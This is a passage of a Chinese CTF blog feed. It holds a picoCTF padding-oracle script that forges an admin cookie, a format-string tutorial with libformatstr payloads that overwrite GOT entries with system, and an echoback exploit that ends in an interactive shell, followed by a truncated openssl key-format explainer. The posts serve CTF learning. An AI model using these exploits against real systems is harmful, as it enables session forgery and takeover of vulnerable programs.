iv</span></span><br></pre></td></tr></table></figure></p><p>但是我们需要进一步改造解密的明文，那么构造一个新的iv,iv’就变成了之前的密文块. 综上迭代就构造出了任意密文，因为iv可控.</p><h3><span id="利用脚本">利用脚本</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line"></span><br><span class="line">plain =[[<span class="string">'&#123;'</span>, <span class="string">'"'</span>, <span class="string">'u'</span>, <span class="string">'s'</span>, <span class="string">'e'</span>, <span class="string">'r'</span>, <span class="string">'n'</span>, <span class="string">'a'</span>, <span class="string">'m'</span>, <span class="string">'e'</span>, <span class="string">'"'</span>, <span class="string">':'</span>, <span class="string">'"'</span>, <span class="string">'a'</span>, <span class="string">'"'</span>, <span class="string">','</span>], [<span class="string">'"'</span>, <span class="string">'e'</span>, <span class="string">'x'</span>, <span class="string">'p'</span>, <span class="string">'i'</span>, <span class="string">'r'</span>, <span class="string">'e'</span>, <span class="string">'s'</span>, <span class="string">'"'</span>, <span class="string">':'</span>, <span class="string">'"'</span>, <span class="string">'2'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'2'</span>, <span class="string">'-'</span>], [<span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'-'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'"'</span>, <span class="string">','</span>, <span class="string">'"'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'_'</span>, <span class="string">'a'</span>, <span class="string">'d'</span>, <span class="string">'m'</span>, <span class="string">'i'</span>, <span class="string">'n'</span>], [<span class="string">'"'</span>, <span class="string">':'</span>, <span class="string">'"'</span>, <span class="string">'t'</span>, <span class="string">'r'</span>, <span class="string">'u'</span>, <span class="string">'e'</span>, <span class="string">'"'</span>, <span class="string">'&#125;'</span>, <span class="string">'\x07'</span>, <span class="string">'\x07'</span>, <span class="string">'\x07'</span>, <span class="string">'\x07'</span>, <span class="string">'\x07'</span>, <span class="string">'\x07'</span>, <span class="string">'\x07'</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cipher</span><span class="params">(now, plain)</span>:</span></span><br><span class="line">    iv = list(<span class="number">16</span> * <span class="string">'\x00'</span>)</span><br><span class="line">    cipher = list(<span class="number">16</span> * <span class="string">'\x00'</span>)</span><br><span class="line">    middle = list(<span class="number">16</span> * <span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            iv[pos] = chr(t)</span><br><span class="line">            success = <span class="literal">False</span></span><br><span class="line">            attemp = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> attemp &lt; <span class="number">2</span> <span class="keyword">and</span> <span class="keyword">not</span> success:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    attemp += <span class="number">1</span></span><br><span class="line">                    sh = remote(<span class="string">'2018shell.picoctf.com'</span>,<span class="string">'6246'</span>)</span><br><span class="line">                    sh.recvuntil(<span class="string">'your cookie?\n'</span>)</span><br><span class="line">                <span class="keyword">except</span> EOFError:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            sh.sendline((<span class="string">''</span>.join(iv)+<span class="string">''</span>.join(now)).encode(<span class="string">'hex'</span>))</span><br><span class="line">            sleep(<span class="number">0.03</span>)</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    tmps = sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span> EOFError:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'invalid'</span> <span class="keyword">in</span> tmps:</span><br><span class="line">                sh.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> pos == <span class="number">15</span>: <span class="comment"># this is a little test incase of that padding is 0x02 0x02</span></span><br><span class="line">                sh = remote(<span class="string">'2018shell.picoctf.com'</span>,<span class="string">'6246'</span>)</span><br><span class="line">                sh.recvuntil(<span class="string">'your cookie?\n'</span>)</span><br><span class="line">                iv[pos<span class="number">-1</span>] = chr(<span class="number">5</span>)</span><br><span class="line">                sh.sendline((<span class="string">''</span>.join(iv)+<span class="string">''</span>.join(now)).encode(<span class="string">'hex'</span>))</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ans = sh.recv()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'invalid'</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">                    iv[pos<span class="number">-1</span>] = <span class="string">'\x00'</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'hit'</span>, ((<span class="string">''</span>.join(iv))+<span class="string">''</span>.join(now)).encode(<span class="string">'hex'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># middle equals chr(16-pos) ^ iv[pos]</span></span><br><span class="line">        middle[pos] = xor(chr(<span class="number">16</span>-pos),iv[pos])</span><br><span class="line">        <span class="comment"># change the iv to fit the next round</span></span><br><span class="line">        <span class="keyword">if</span> pos == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">15</span>,pos<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            iv[k] = xor(middle[k],chr(<span class="number">16</span>-pos+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># hit cipher</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'success!'</span></span><br><span class="line">    cipher = [xor(xor(<span class="string">'\x10'</span>,iv[i]),plain[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'iv:'</span>,(<span class="string">''</span>.join(iv)).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ci:'</span>,(<span class="string">''</span>.join(cipher)).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher,iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [<span class="string">'\xba\xdeY\x10\x97d\xfe\xbe\xa2\xc7u\nM\xae\x94\xdc'</span>]</span><br><span class="line"></span><br><span class="line">nt = list(<span class="string">'\xba\xdeY\x10\x97d\xfe\xbe\xa2\xc7u\nM\xae\x94\xdc'</span>)</span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    tmp,iiv = get_cipher(nt,plain[<span class="number">3</span>-pos])</span><br><span class="line">    payload.append(<span class="string">''</span>.join(tmp))</span><br><span class="line">    nt = tmp</span><br><span class="line"><span class="keyword">print</span> <span class="string">'finished\n\n'</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">''</span>.join(payload[::<span class="number">-1</span>])).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ff68a8f849dabdf542891806a6b89337b563fab273a1c630dcb837cf6afdaddc212cfc95c3788fa5d0dacaa9a0aca60b0d703e74376e7863710c057471115544bade59109764febea2c7750a4dae94dc</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2019/03/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2019/03/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>记录一下对于格式化字符串的利用，如果比赛里有格式化字符串的题如何迅速拿到一血</p></blockquote><a id="more"></a><h2><span id="基本知识">基本知识</span></h2><h3><span id="格式化字符串原理">格式化字符串原理</span></h3><p>借用ctf-wiki上的图<br><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png" alt="格式化字符串"><br>此时printf的参数分布如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">some value           # 高地址</span><br><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">3.14</span><br><span class="line">123456</span><br><span class="line">addr of &quot;red&quot;</span><br><span class="line">addr of format string: Color %s...          #低地址</span><br><span class="line">rip</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>对于一个一般格式化字符串利用场景中，vuln函数的栈上情况是这样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">some value</span><br><span class="line">formatstr content</span><br><span class="line">formatstr content</span><br><span class="line">formatstr content <span class="comment"># considered as arg5</span></span><br><span class="line">somevalue <span class="comment"># considered as arg4</span></span><br><span class="line">somevalue <span class="comment"># considered as arg3</span></span><br><span class="line">arg2</span><br><span class="line">arg1</span><br><span class="line">addr of format string <span class="comment"># arg0</span></span><br><span class="line">eip</span><br><span class="line"><span class="keyword">print</span><span class="string">f's ebp</span></span><br></pre></td></tr></table></figure></p><p>从addr of format string到formatstr content的距离(按照4字节为单位64位机按8字节)叫做offset.</p><h3><span id="记录表">记录表</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p><strong>不记得原理可以看下表</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">这部分来自icemakr的博客</span><br><span class="line"></span><br><span class="line">32位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index)           // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 同上面</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">////////////////////////////</span><br><span class="line">64位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index, num)      // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$lx&apos;.format(index, num)     // 读8个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 读8个字节</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">%1$lx: RSI</span><br><span class="line">%2$lx: RDX</span><br><span class="line">%3$lx: RCX</span><br><span class="line">%4$lx: R8</span><br><span class="line">%5$lx: R9</span><br><span class="line">%6$lx: 栈上的第一个QWORD</span><br></pre></td></tr></table></figure></p><h2><span id="libformatstr">libformatstr</span></h2><h3><span id="基本">基本</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成pattern串判断参数在格式化串的位置 </span></span><br><span class="line"><span class="comment">#BUF_SZ = 80  格式化串的长度</span></span><br><span class="line"><span class="comment">#pat = libformatstr.make_pattern(BUF_SZ)</span></span><br><span class="line"><span class="comment">#io.sendline(pat)</span></span><br><span class="line"><span class="comment">#res = io.recv()</span></span><br><span class="line"><span class="comment"># argnum 表示第argnum个参数位于格式化串首部</span></span><br><span class="line"><span class="comment"># padding 表示使参数对齐需要添加的字节数 0-3</span></span><br><span class="line"><span class="comment">#argnum, padding = libformatstr.guess_argnum(res, BUF_SZ)</span></span><br><span class="line"><span class="comment">#print('argnum:%d padding:%d'%(argnum, padding))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入printf.got为system</span></span><br><span class="line">argnum = <span class="number">6</span></span><br><span class="line">padding = <span class="number">0</span></span><br><span class="line">p = libformatstr.FormatStr()</span><br><span class="line">p[e.got[<span class="string">'printf'</span>]]= e.plt[<span class="string">'system'</span>]</span><br><span class="line">p[e.got[<span class="string">'exit'</span>]] = <span class="number">0x080485EE</span> <span class="comment"># main</span></span><br><span class="line">fmt_str = p.payload(argnum, padding, start_len=<span class="number">0</span>) <span class="comment"># 0 表示之前打印出的字符</span></span><br><span class="line">log.info(<span class="string">'payload:\n %s'</span> % hexdump(fmt_str))</span><br></pre></td></tr></table></figure><h3><span id="举例">举例</span></h3><h4><span id="case1">case1</span></h4><p>替换got表内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x08049580</span></span><br><span class="line">system_addr = <span class="number">0x080489a3</span></span><br><span class="line"></span><br><span class="line">p = FormatStr()</span><br><span class="line">p[addr] = system_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf is 14th argument, 4 bytes are already printed</span></span><br><span class="line">sys.stdout.write( p.payload(<span class="number">14</span>, start_len=<span class="number">4</span>) ) <span class="comment"># print格式化字符串之前的 已经被打印的字符</span></span><br></pre></td></tr></table></figure></p><h4><span id="case2">case2</span></h4><p>在某个地址放rop<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x08049580</span></span><br><span class="line">rop = [<span class="number">0x080487af</span>, <span class="number">0x0804873c</span>, <span class="number">0x080488de</span>]</span><br><span class="line">p = FormatStr()</span><br><span class="line">p[addr] = rop</span><br><span class="line"></span><br><span class="line">sys.stdout.write( p.payload(<span class="number">14</span>) )</span><br></pre></td></tr></table></figure></p><h4><span id="case3">case3</span></h4><p>猜偏移和padding<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line"></span><br><span class="line"><span class="comment"># let's say we have do_fmt function,</span></span><br><span class="line"><span class="comment"># which gives us only output of format string</span></span><br><span class="line"><span class="comment"># (you can also just copy fmtstr and output manually)</span></span><br><span class="line"></span><br><span class="line">buf_size = <span class="number">250</span>  <span class="comment"># fix buf_size to avoid offset variation</span></span><br><span class="line">res = do_fmt(make_pattern(buf_size))</span><br><span class="line">argnum, padding = guess_argnum(res, buf_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># of course you can use it in payload generation</span></span><br><span class="line"></span><br><span class="line">p = FormatStr(buf_size)</span><br><span class="line">p[<span class="number">0xbffffe70</span>] = <span class="string">"\x70\xfe\xff\xbf\xeb\xfe"</span>  <span class="comment"># yes, you can also put strings</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write( p.payload(argnum, padding, <span class="number">3</span>) ) <span class="comment"># we know 3 bytes were printed already</span></span><br></pre></td></tr></table></figure></p><h4><span id="case4">case4</span></h4><p>64位的情况下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">f=FormatStr(isx64=<span class="number">1</span>) <span class="comment">#This option force script to use 64bit address while generating payload</span></span><br><span class="line">f[<span class="number">0x1234</span>]=<span class="number">0x1</span></span><br><span class="line">f[<span class="number">0x5678</span>]=<span class="number">0x2</span></span><br><span class="line">f[<span class="number">0xabcd</span>]=<span class="number">0x3</span></span><br></pre></td></tr></table></figure></p><h2><span id="实例">实例</span></h2><h3><span id="picoctf-echoback">picoctf-echoback</span></h3><p>坑就是一个，之前没用recvuntil，重新回到main之前莫名其妙打印一堆东西，调了我半天。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echoback'</span>)</span><br><span class="line">sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">puts_got = <span class="number">0x0804A01C</span></span><br><span class="line">sys_got = <span class="number">0x0804A020</span></span><br><span class="line">buf_size = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = FormatStr()</span></span><br><span class="line"><span class="comment"># res = do_fmt(make_pattern(buf_size))</span></span><br><span class="line"><span class="comment"># argnum, padding = guess_argnum(res, buf_size)</span></span><br><span class="line"><span class="comment"># print 'argnum:',argnum,' padding:',padding</span></span><br><span class="line"><span class="comment"># argnum 7, padding 0</span></span><br><span class="line"></span><br><span class="line">p = FormatStr()</span><br><span class="line">p[elf.got[<span class="string">'puts'</span>]] = <span class="number">0x080485ab</span></span><br><span class="line">p[elf.got[<span class="string">'printf'</span>]] = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">pause()</span><br><span class="line">sh.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">payload = p.payload(<span class="number">7</span>,<span class="number">0</span>,start_len=<span class="number">0</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> formatstr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openssl相关知识</title>
      <link href="/2019/03/26/openssl%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
      <url>/2019/03/26/openssl%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>做到密码学的题给秘钥经常用pem格式的，这里就需要学习一下openssl怎么处理秘钥，加密文件等知识<br><a id="more"></a></p></blockquote><h2><span id="ans1-amp-der-amp-pem">ANS.1 &amp; DER &amp; PEM</span></h2><blockquote><p>openssl的数据编码规则是基于ans.1：<br>ASN.1(=Abstract Syntax Notation One)，是一种结构化的描述语言，包括两部分,数据描述语言和数据编码规则。标准ASN.1编码规则有规范编码规则（CER，Canonical Encoding Rules）、唯一编码规则（DER，Distinguished Encoding Rules）、压缩编码规则（PER，Packed Encoding Rules）和XML编码规则（XER，XML Encoding Rules）。</p></blockquote><p>openssl使用pem作为基本的文件编码格式，pem和der的关系如下图所示，其中几种加密环节是可选的：</p><p><img src="/assets/img/openssl/pem.png" alt="pem和der"><br>从本质上来说，openssl是pem编码就是在der编码的技术上进行Base64编码，然后添加一些头尾信息组成，可以通过openssl指令对der和pem进行格式转换。</p><blockquote><p>Distinguished Encoding Rules (DER) is a binary serialization of ASN.1 format. It is often used for cryptographic data such as certificates, but has other uses. </p></blockquote><p>即DER是二进制格式的秘钥，PEM是把DER给base64编码这样看起来有好一点</p><h2><span id="密钥编码">密钥编码</span></h2><p>openssl有多种形式的密钥，openssl提供PEM和DER两种编码方式对这些密钥进行编码，并提供相关指令可以使用户在这两种格式之间进行转换。一个经过加密的PEM编码密钥文件会在PEM文件中增加一些头信息，表明密钥的加密状态，加密算法及初始化向量等信息。</p><h2><span id="公钥pem">公钥PEM</span></h2><h3><span id="pkcs-1">PKCS #1</span></h3><p>KCS #1 标准是专门为 RSA 密钥进行定义的，其对应的 PEM 文件格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">BASE64 ENCODED DATA</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p>上面的内容 BASE64 ENCODED DATA 指的就是 ANS.1 的 DER 的 Base64 编码。其ASN.1的格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RSAPublicKey ::= SEQUENCE &#123;</span><br><span class="line">    modulus           INTEGER,  -- n</span><br><span class="line">    publicExponent    INTEGER   -- e</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>modulus 是RSA的模数n</li><li>publicExponent 是RSA公钥e</li></ul><h3><span id="pkcs-8">PKCS #8</span></h3><p>PKCS#8 标准定义了一个密钥格式的通用方案，它不仅仅为 RSA 所使用，同样也可以被其它密钥所使用。其对应的PEM文件格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">BASE64 ENCODED DATA</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p>注意，这里就没有 RSA 字样了，因为 PKCS#8 是一个通用型的秘钥格式方案；其中的 BASE64 ENCODED DATA 所标注的内容为 PEM 格式中对 DER 原始二进制进行的 BASE64 编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PublicKeyInfo ::= SEQUENCE &#123;</span><br><span class="line">  algorithm       AlgorithmIdentifier,</span><br><span class="line">  PublicKey       BIT STRING</span><br><span class="line">&#125;</span><br><span class="line">AlgorithmIdentifier ::= SEQUENCE &#123;</span><br><span class="line">  algorithm       OBJECT IDENTIFIER,</span><br><span class="line">  parameters      ANY DEFINED BY algorithm OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>PKCS#8 虽然名字叫做 Private-Key Information Syntax Specification，但是实际上，可以看到，它同样可以用作 Public Key 的格式定义；而 PKCS#8 是站在 PKCS#7 CMS 的基础之上进行编码格式定义的。</p><h2><span id="私钥pem">私钥PEM</span></h2><h3><span id="pkcs-1">PKCS #1</span></h3><p>PKCS#1 是专门为 RSA 所涉及的，其对应的 PEM 格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">BASE64 ENCODED DATA</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p><p>原始的 DER 格式结构，既是 ASN.1 的数据结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 